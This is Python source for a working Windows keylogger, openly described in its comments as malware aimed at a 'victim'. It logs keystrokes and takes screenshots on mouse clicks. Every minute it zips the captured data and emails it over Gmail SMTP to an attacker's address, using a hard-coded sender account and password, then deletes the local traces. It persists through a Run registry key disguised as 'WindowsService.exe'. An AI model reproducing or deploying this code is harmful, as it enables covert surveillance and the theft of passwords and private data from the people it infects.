#keylogger libs
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, time
import pyautogui as py 
import threading

#email libs
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from zipfile import ZipFile
import smtplib

#persistence libs
import ctypes
import winreg as reg

#global
running = True
timer = 10

# ..reading threads
def onClick(x, y, buttom, pressed):
    global running

    if pressed and running:
        my_screenshot = py.screenshot()
        hora = datetime.now()
        print_time = hora.strftime("%H:%M:%S")
        print_time = print_time.replace(":", "_")
        my_screenshot.save(os.path.join(root_dir, "PrintKeyLogger_" + print_time + ".jpg"))

def onPress(key):
    global running

    if running:
        key = str(key)
        key = re.sub(r'\'', '', key)
        key = re.sub(r'Key.space', ' ', key)    
        key = re.sub(r'Key.tab', '\t', key)
        key = re.sub(r'Key.enter', '\n', key)
        key = re.sub(r'Key.backspace', 'apagar', key)
        key = re.sub(r'Key.*', '', key)
        with open(log_file, 'a') as log:
            if str(key) == str("apagar"):
                if os.stat(log_file).st_size !=0:
                    key = re.sub(r'Key.backspace', '', key)
                    log.seek(0,2)
                    caractere = log.tell()
                    log.truncate(caractere - 1)
            else:    
                log.write(key)

# ..finds desktop user of victim's computer..
def findUser():
    name = os.popen('whoami').read()
    split = name.split("\\")
    strip= split[1].strip("\n")
    
    return strip

# ..configurates and send an email to the attacker 
# that contains the collected data..
def sendEmail(current_date, date, root_dir, log_file, zip_filename, path_zipfile):

    global running 
    running = False

    # ..constants
    sender_email = "eulastones@gmail.com"
    receiver_email = "jaocudjmctaetae@gmail.com"
    gmail_pass = "sueq wmbt eyrm mzkv"
    
    # ..creates zipped file
    with ZipFile(zip_filename, 'a') as zip:
        for file in os.listdir(root_dir):
            file_path = os.path.join(root_dir, file)
            zip.write(file_path, os.path.basename(file_path))

    # ..email content
    subject = "An email with attachment from Python"
    body = "This is an email with attachment sent from Python"

    # ..lib config
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email 

    # ..creates attachment
    message.attach(MIMEText(body, "plain"))

    with open(zip_filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {zip_filename}",
    )

    message.attach(part)
    text = message.as_string()

    # ..smtp configuration
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, gmail_pass)
    print("login succeded")
    
    # ..sends email
    server.sendmail(sender_email, receiver_email, text)
    print("email sent")
    server.quit()

    # ..deletes file sent
    for f in os.listdir(root_dir):
        os.remove(os.path.join(root_dir, f))
    os.remove(zip_filename)

    print("arquivos enviados e excluidos com sucesso!")

    running = True

# ..timer to email attacker
def emailTimer(current_date, date, root_dir, log_file, zip_filename, path_zipfile):
    global timer

    while True:
        for i in range(60):
            time.sleep(1)

            if(i == 59):
                # print("entrou")
                sendEmail(current_date, date, root_dir, log_file, zip_filename, path_zipfile)

# ..adds script to regedit so it can run everytime the pc resets..            
def add_registry_entry():
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_SET_VALUE) as open_key:
            reg.SetValueEx(open_key, "WindowsService.exe", 0, reg.REG_SZ, os.path.realpath(__file__))
    except Exception as e:
        pass
    
# def show_message():
#     ctypes.windll.user32.MessageBoxW(0, "O malware foi executado com sucesso!", "Teste de Persistência", 1)

if __name__ == '__main__':
    add_registry_entry()
    
    current_date = datetime.now()
    date = current_date.strftime("%d-%m")
    
    # ..creates directory to store the data collected
    root_dir = ("C:/Users/"+ findUser() +"/Documents/Keylogger_" + date + "/")
    path_zipfile = "C:/Users/"+ findUser() +"/Documents/"
    log_file = root_dir + "Keylogger.log"
    zip_filename = os.path.join(path_zipfile, 'keylogger.zip')
 
    try:
        os.mkdir(root_dir)
    except:
        pass

    # ..threads
    keyboardListener = KeyboardListener(on_press=onPress)
    mouseListener = MouseListener(on_click=onClick)
    emailThread = threading.Thread(target=emailTimer, args=(current_date, date, root_dir, log_file, zip_filename, path_zipfile))

    keyboardListener.start()
    mouseListener.start()
    emailThread.start()